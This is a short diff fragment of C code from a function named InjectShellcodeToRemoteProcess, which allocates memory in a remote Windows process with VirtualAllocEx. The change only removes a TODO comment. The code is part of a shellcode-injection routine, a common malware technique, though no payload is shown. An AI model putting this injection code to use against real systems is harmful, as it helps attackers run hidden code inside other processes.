@@ -171,7 +171,6 @@ BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sS
 	DWORD dwOldProtection = NULL;
 
 	// Allocate memory in the remote process of size `sSizeOfShellcode`
-	// TODO: Look up VirtualAllocEx and WriteProcessMemory docs
 	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (pShellcodeAddress == NULL) {
 		printf("[!] VirtualAllocEx failed with error: %d\n", GetLastError());
